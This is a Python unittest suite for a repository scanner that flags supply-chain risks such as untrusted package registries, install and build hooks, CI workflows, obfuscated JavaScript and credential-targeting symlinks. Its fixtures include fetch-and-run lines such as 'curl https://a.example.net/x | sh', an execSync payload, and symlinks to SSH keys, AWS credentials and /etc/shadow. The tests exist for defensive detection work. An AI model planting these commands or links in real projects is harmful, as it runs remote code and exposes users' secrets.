import json
import os
import tempfile
import unittest
from pathlib import Path

from honeyrun.static import obfuscation, scan


def repo(files: dict, links: dict | None = None) -> Path:
    root = Path(tempfile.mkdtemp())
    for rel, body in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(body if isinstance(body, bytes) else body.encode())
    for rel, target in (links or {}).items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        os.symlink(target, root / rel)
    return root


def rules(files, links=None):
    return {(f.severity, f.rule) for f in scan(repo(files, links))}


def has(files, sev, rule, links=None):
    return (sev, rule) in rules(files, links)


def pj(**kw):
    return json.dumps({"name": "demo-pkg", "version": "1.0.0", **kw})


class PackageConfig(unittest.TestCase):
    def test_npmrc_script_shell_and_node_options(self):
        self.assertTrue(has({".npmrc": "script-shell=./evil.sh\n"}, "medium", "pkg-config"))
        self.assertTrue(has({".npmrc": "node-options=--require ./x.js\n"}, "medium", "pkg-config"))
        self.assertTrue(has({".npmrc": "ignore-scripts=false\n"}, "medium", "pkg-config"))

    def test_npmrc_registry(self):
        self.assertTrue(has({".npmrc": "registry=https://npm.example.net/\n"}, "medium", "pkg-config"))
        self.assertTrue(has({".npmrc": "registry=http://npm.example.net/\n"}, "high", "pkg-config"))
        self.assertTrue(has({".npmrc": "@acme:registry=https://203.0.113.9/\n"}, "high", "pkg-config"))

    def test_default_npm_config_is_silent(self):
        self.assertEqual(rules({".npmrc": "registry=https://registry.npmjs.org/\npackage-lock=false\nignore-scripts=true\n"}), set())

    def test_yarn_and_pnpm(self):
        self.assertTrue(has({".yarnrc.yml": "yarnPath: .yarn/releases/yarn.cjs\n"}, "medium", "pkg-config"))
        self.assertTrue(has({".yarnrc.yml": "plugins:\n  - path: x.cjs\n"}, "medium", "pkg-config"))
        self.assertTrue(has({".yarnrc": 'yarn-path ".yarn/yarn.js"\n'}, "medium", "pkg-config"))
        self.assertTrue(has({".pnpmfile.cjs": "module.exports = {}\n"}, "medium", "pkg-config"))
        self.assertEqual(rules({".yarnrc.yml": "nodeLinker: node-modules\n"}), set())

    def test_pip_indexes(self):
        self.assertTrue(has({"requirements.txt": "--extra-index-url https://pkgs.example.net/simple\nrequests\n"}, "medium", "pkg-config"))
        self.assertTrue(has({"requirements-dev.txt": "-i http://pkgs.example.net/simple\n"}, "high", "pkg-config"))
        self.assertTrue(has({"pip.conf": "[global]\nindex-url = https://203.0.113.5/simple\n"}, "high", "pkg-config"))
        self.assertTrue(has({"setup.cfg": "[metadata]\nname=x\n[pip]\ntrusted-host = pkgs.example.net\n"}, "medium", "pkg-config"))
        self.assertTrue(has({"pyproject.toml": '[tool.pip]\nindex-url = "https://pkgs.example.net/simple"\n'}, "medium", "pkg-config"))

    def test_pypi_index_and_plain_requirements_are_silent(self):
        self.assertEqual(rules({"requirements.txt": "--index-url https://pypi.org/simple\nrequests==2.0\n"}), set())
        self.assertEqual(rules({"setup.cfg": "[metadata]\nname = x\n[flake8]\nmax-line-length = 100\n"}), set())


class DevAutorun(unittest.TestCase):
    def test_conftest_network_is_medium_plain_is_silent(self):
        self.assertTrue(has({"conftest.py": "import urllib.request\nurllib.request.urlopen('https://a.example.net')\n"}, "medium", "dev-autorun"))
        self.assertEqual(rules({"tests/conftest.py": "import pytest\n@pytest.fixture\ndef x():\n    return 1\n"}), set())

    def test_conftest_fetch_exec_is_high(self):
        self.assertTrue(has({"conftest.py": "import os\nos.system('curl -s https://a.example.net/x | sh')\n"}, "high", "dev-autorun"))

    def test_makefile_only_default_target(self):
        mk = "build:\n\tgo build ./...\n\ndeploy:\n\tcurl https://a.example.net/x | sh\n"
        self.assertEqual(rules({"Makefile": mk}), set())
        mk2 = "all:\n\tcurl -s https://a.example.net/x | sh\n\nclean:\n\trm -rf out\n"
        self.assertTrue(has({"Makefile": mk2}, "high", "dev-autorun"))
        self.assertTrue(has({"noxfile.py": "import subprocess\nsubprocess.run(['curl','https://a.example.net'])\n"}, "medium", "dev-autorun"))

    def test_build_rs(self):
        self.assertTrue(has({"build.rs": 'fn main(){ std::process::Command::new("curl").arg("http://a.example.net").status().ok(); }\n'}, "medium", "dev-autorun"))
        self.assertTrue(has({"build.rs": 'static B: &[u8] = include_bytes!("blob.bin");\n'}, "medium", "dev-autorun"))
        self.assertEqual(rules({"build.rs": 'fn main(){ println!("cargo:rerun-if-changed=build.rs"); }\n'}), set())

    def test_go_generate(self):
        self.assertTrue(has({"gen.go": "package x\n//go:generate curl -o a.go https://a.example.net/a.go\n"}, "medium", "dev-autorun"))
        self.assertTrue(has({"gen.go": "package x\n//go:generate sh -c 'make'\n"}, "medium", "dev-autorun"))
        self.assertEqual(rules({"gen.go": "package x\n//go:generate stringer -type=Pill\n"}), set())

    def test_wrapper_jar_with_foreign_url(self):
        files = {"gradle/wrapper/gradle-wrapper.jar": b"PK\x05\x06" + b"\x00" * 18,
                 "gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https\\://dl.example.net/gradle-8.zip\n"}
        self.assertTrue(has(files, "medium", "dev-autorun"))
        files["gradle/wrapper/gradle-wrapper.properties"] = "distributionUrl=https\\://services.gradle.org/distributions/gradle-8.zip\n"
        self.assertEqual(rules(files), set())
        files = {".mvn/wrapper/maven-wrapper.jar": b"PK\x05\x06" + b"\x00" * 18,
                 ".mvn/wrapper/maven-wrapper.properties": "distributionUrl=https://dl.example.net/maven.zip\n"}
        self.assertTrue(has(files, "medium", "dev-autorun"))


class PackageJson(unittest.TestCase):
    def test_bin_shadow(self):
        self.assertTrue(has({"package.json": pj(bin={"git": "bin/g.js"})}, "high", "bin-shadow"))
        self.assertTrue(has({"package.json": pj(name="sudo", bin="x.js")}, "high", "bin-shadow"))
        self.assertTrue(has({"package.json": pj(bin={"claude": "x.js", "codex": "y.js"})}, "high", "bin-shadow"))

    def test_normal_bin_is_silent(self):
        self.assertEqual(rules({"package.json": pj(bin={"demo": "bin/demo.js"})}), set())

    def test_dependency_sources(self):
        self.assertTrue(has({"package.json": pj(dependencies={"x": "http://pkgs.example.net/x.tgz"})}, "medium", "dep-source"))
        self.assertTrue(has({"package.json": pj(dependencies={"x": "https://203.0.113.4/x.tgz"})}, "medium", "dep-source"))
        self.assertTrue(has({"package.json": pj(dependencies={"x": "github:someone/x"})}, "info", "dep-source"))
        self.assertTrue(has({"package.json": pj(overrides={"y": {"z": "git+https://github.com/a/z.git"}})}, "info", "dep-source"))
        self.assertTrue(has({"package.json": pj(resolutions={"y": "file:../y"})}, "info", "dep-source"))
        self.assertEqual(rules({"package.json": pj(dependencies={"x": "^1.2.3", "y": "workspace:*"})}), set())

    def test_dependency_confusion_bait(self):
        self.assertTrue(has({"package.json": pj(dependencies={"@acme/internal-auth": "^99.0.0"})}, "info", "dep-confusion"))
        self.assertTrue(has({"package.json": pj(dependencies={"corp-utils": "9999.0.0"})}, "info", "dep-confusion"))
        self.assertEqual(rules({"package.json": pj(dependencies={"@types/node": "^20.1.0", "left-pad": "99.1.0"})}), set())


class Workflows(unittest.TestCase):
    BAD = ("on:\n  pull_request_target:\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@v4\n"
           "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n")

    def test_untrusted_checkout(self):
        self.assertTrue(has({".github/workflows/ci.yml": self.BAD}, "medium", "ci-untrusted-checkout"))
        wr = self.BAD.replace("pull_request_target", "workflow_run")
        self.assertTrue(has({".github/workflows/ci.yaml": wr}, "medium", "ci-untrusted-checkout"))

    def test_safe_workflows_are_silent(self):
        plain = "on:\n  pull_request:\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
        self.assertEqual(rules({".github/workflows/ci.yml": plain}), set())
        target_only = "on:\n  pull_request_target:\njobs:\n  l:\n    steps:\n      - uses: actions/labeler@v5\n"
        self.assertEqual(rules({".github/workflows/l.yml": target_only}), set())
        commented = self.BAD.replace("          ref:", "          # ref:")
        self.assertEqual(rules({".github/workflows/c.yml": commented}), set())


# Windows needs Developer Mode to create symlinks, and git there checks repo symlinks out as text files.
NO_SYMLINKS = os.name == "nt"


@unittest.skipIf(NO_SYMLINKS, "symlinks are not available on this Windows runner")
class Symlinks(unittest.TestCase):
    def test_credential_targets_are_high(self):
        self.assertTrue(has({"a.txt": "x"}, "high", "symlink-escape", links={"k": "/root/.ssh/id_rsa"}))
        self.assertTrue(has({"a.txt": "x"}, "high", "symlink-escape", links={"d/aws": "../../.aws/credentials"}))
        self.assertTrue(has({"a.txt": "x"}, "high", "symlink-escape", links={"e": "/etc/shadow"}))

    def test_other_outside_targets_are_medium(self):
        self.assertTrue(has({"a.txt": "x"}, "medium", "symlink-escape", links={"t": "/usr/share/dict/words"}))
        self.assertTrue(has({"a.txt": "x"}, "medium", "symlink-escape", links={"d/up": "../../elsewhere"}))

    def test_inside_links_are_silent_and_never_followed(self):
        r = repo({"a.txt": "x", "sub/b.txt": "y"}, links={"l1": "a.txt", "sub/l2": "../a.txt"})
        self.assertEqual([f for f in scan(r) if f.rule == "symlink-escape"], [])
        outside = Path(tempfile.mkdtemp())
        (outside / "payload.js").write_text("require('child_process').execSync('curl http://x.example.net | sh')")
        r = repo({"a.txt": "x"}, links={"loop": str(outside / "payload.js")})
        got = scan(r)
        self.assertFalse([f for f in got if f.rule == "install-hook" or f.severity == "high" and f.rule != "symlink-escape"])


class Obfuscation(unittest.TestCase):
    def test_signatures(self):
        ids = "".join(f"var _0x{0x1000 + i * 3:04x}={i};" for i in range(25))
        self.assertIsNotNone(obfuscation(ids))
        self.assertIsNotNone(obfuscation("x='" + "\\x41" * 45 + "'"))
        self.assertIsNotNone(obfuscation("String.fromCharCode(" + ",".join(str(65 + i % 20) for i in range(32)) + ")"))
        self.assertIsNotNone(obfuscation("[]" + "+!" * 120 + "[]" * 40))
        self.assertIsNone(obfuscation("function add(a,b){return a+b}\nconst s='\\x41\\x42'\nString.fromCharCode(65,66)"))
        self.assertIsNone(obfuscation("var _0x1a2b=1;var _0x1a2c=2;"))

    def test_hooked_is_medium_elsewhere_info(self):
        ids = "".join(f"var _0x{0x1000 + i * 3:04x}={i};" for i in range(25))
        hooked = {"package.json": pj(scripts={"postinstall": "node setup.js"}), "setup.js": ids}
        self.assertTrue(has(hooked, "medium", "obfuscated-js"))
        self.assertTrue(has({"package.json": pj(main="lib/main.js"), "lib/main.js": ids}, "medium", "obfuscated-js"))
        self.assertTrue(has({"lib/other.js": ids}, "info", "obfuscated-js"))

    def test_min_js_only_when_hooked(self):
        ids = "".join(f"var _0x{0x1000 + i * 3:04x}={i};" for i in range(25))
        self.assertEqual(rules({"vendor/lib.min.js": ids}), set())
        got = rules({"package.json": pj(scripts={"postinstall": "node lib.min.js"}), "lib.min.js": ids})
        self.assertIn(("medium", "obfuscated-js"), got)


class CompiledPython(unittest.TestCase):
    def test_pyc_without_source(self):
        self.assertTrue(has({"lib/mod.pyc": b"\x00\x00\x00\x00"}, "medium", "compiled-python"))
        self.assertTrue(has({"pkg/__pycache__/mod.cpython-312.pyc": b"\x00\x00"}, "medium", "compiled-python"))

    def test_pycache_with_source_is_silent(self):
        self.assertEqual(rules({"pkg/mod.py": "x = 1\n", "pkg/__pycache__/mod.cpython-312.pyc": b"\x00\x00"}), set())

    def test_hooked_compiled_files_are_high(self):
        files = {"package.json": pj(scripts={"postinstall": "node ./build/addon.node"}), "build/addon.node": b"\x7fELF" + b"\x00" * 100}
        self.assertTrue(has(files, "high", "compiled-hook"))
        files = {"setup.py": "import x\nx.load('payload.so')\n", "payload.so": b"\x7fELF" + b"\x00" * 100}
        self.assertTrue(has(files, "high", "compiled-hook"))


class Privacy(unittest.TestCase):
    SDK = {"package.json": pj(dependencies={"@sentry/node": "^8.0.0", "posthog-node": "^4.0.0"})}

    def test_sdk_without_policy_is_info(self):
        got = rules(self.SDK)
        self.assertIn(("info", "data-sharing"), got)
        self.assertIn(("info", "privacy-policy"), got)
        self.assertNotIn(("medium", "privacy-policy"), got)

    def test_policy_file_or_readme_section_clears_it(self):
        self.assertNotIn("privacy-policy", {r for _, r in rules({**self.SDK, "PRIVACY.md": "# Privacy\n"})})
        self.assertNotIn("privacy-policy", {r for _, r in rules({**self.SDK, "README.md": "# demo\n\n## Telemetry\nWe send x.\n"})})
        self.assertNotIn("privacy-policy", {r for _, r in rules({**self.SDK, "TERMS.md": "terms"})})

    def test_mcp_server_and_plugin_are_medium(self):
        mcp = {"package.json": pj(dependencies={"@modelcontextprotocol/sdk": "^1.0.0", "@sentry/node": "^8.0.0"})}
        self.assertIn(("medium", "privacy-policy"), rules(mcp))
        py = {"pyproject.toml": '[project]\nname = "srv"\nversion = "1"\ndependencies = ["mcp>=1.0", "sentry-sdk>=2"]\n'}
        self.assertIn(("medium", "privacy-policy"), rules(py))
        plugin = {**self.SDK, ".claude-plugin/plugin.json": "{}"}
        self.assertIn(("medium", "privacy-policy"), rules(plugin))
        self.assertNotIn(("medium", "privacy-policy"), rules({**mcp, "PRIVACY.md": "p"}))

    def test_requirements_python_sdks(self):
        self.assertIn(("info", "data-sharing"), rules({"requirements.txt": "requests\nsentry-sdk==2.0\n"}))
        self.assertNotIn(("info", "data-sharing"), rules({"requirements-dev.txt": "sentry-sdk==2.0\n"}))

    def test_no_sdks_no_findings(self):
        self.assertEqual(rules({"package.json": pj(dependencies={"express": "^4.0.0"})}), set())

    def test_data_sharing_lists_names(self):
        f = [x for x in scan(repo(self.SDK)) if x.rule == "data-sharing"][0]
        self.assertIn("@sentry/node", f.title)
        self.assertIn("posthog-node", f.title)

    def test_optout_envs(self):
        files = {"index.js": "if (process.env.DO_NOT_TRACK || process.env.ACME_TELEMETRY_DISABLED) return;\n"}
        f = [x for x in scan(repo(files)) if x.rule == "telemetry-optout"]
        self.assertTrue(f and "DO_NOT_TRACK" in f[0].title and "ACME_TELEMETRY_DISABLED" in f[0].title)
        self.assertEqual(f[0].severity, "info")


class Robust(unittest.TestCase):
    def test_hostile_inputs_do_not_crash(self):
        got = scan(repo({
            "package.json": json.dumps({"bin": 5, "dependencies": ["x"], "overrides": {"a": {"b": {"c": {"d": {"e": {"f": "g"}}}}}}}),
            ".npmrc": "\x00\xff garbage =\n", "requirements.txt": "-i\n--index-url\n", "Makefile": ":\n\t\n",
            ".github/workflows/x.yml": "on: [pull_request_target]\n", "build.rs": "", "conftest.py": "",
        }))
        self.assertIsInstance(got, list)

    def test_findings_carry_file_paths(self):
        for f in scan(repo({".npmrc": "script-shell=x\n", ".pnpmfile.cjs": "x"})):
            self.assertTrue(f.file)


class Fixtures(unittest.TestCase):
    FIX = Path(__file__).resolve().parent.parent / "bench" / "fixtures"

    @unittest.skipIf(NO_SYMLINKS, "the fixture's symlink is checked out as a text file on Windows")
    def test_rare_fixture_hits_every_listed_rule(self):
        exp = json.loads((self.FIX / "mal-static-rare" / "expected.json").read_text())
        got = {f.rule for f in scan(self.FIX / "mal-static-rare") if f.severity != "info"}
        self.assertFalse(set(exp["rules"]) - got)

    def test_assets_fixture_has_no_medium_or_high(self):
        bad = [f for f in scan(self.FIX / "ok-static-assets") if f.severity != "info"]
        self.assertEqual(bad, [])
